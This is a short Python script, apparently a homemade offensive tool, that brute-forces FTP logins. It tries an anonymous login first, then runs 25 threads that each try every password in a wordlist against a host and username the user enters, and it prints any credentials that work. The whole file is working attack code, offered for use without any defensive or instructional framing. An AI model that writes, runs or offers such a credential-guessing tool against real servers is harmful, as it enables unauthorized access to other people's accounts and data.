import ftplib
import threading
import sys
from termcolor import colored

def check_login(host,user,pwd):
    try:
        FTP = ftplib.FTP(host)
        FTP.login(user,pwd)
        FTP.quit()
        print(colored("[+]Successfully Logged In!","green"))
        print(colored("Username:{}\nPassword:{}".format(user,pwd),"green"))
        exit(0)
    except:
        pass

def default_login(host):
    try:
        FTP = ftplib.FTP(host)
        FTP.login()
        print(colored("Successfully Logged in as Anonymous","green"))
        exit(0)
    except:
        pass
    
def brute_login(host,username,passfile):
    try:
        print(colored("[+]Attacking {} with username {}".format(host,username),"blue",attrs=["reverse","blink"]))
        passfile = open(passfile,"r")
        for i,pwd in enumerate(passfile.readlines()):
            pwd = pwd.strip()
            sys.stdout.write("\r"+str(i))
            sys.stdout.flush()
            check_login(host,username,pwd)
    except Exception as E:
        print(E)
        print(colored("[!]None of the Password Matched/Other issue encountered!","red",attrs=["underline"]))
    
def main():
    host = input("Enter Host Address:")
    file = input("Enter Filename:")
    user = input("Enter Username :")
    default_login(host)
    for i in range(25):
            t = threading.Thread(target=brute_login,args=(host,user,file))
            t.start()
    print("[!]Process Complete!")




    
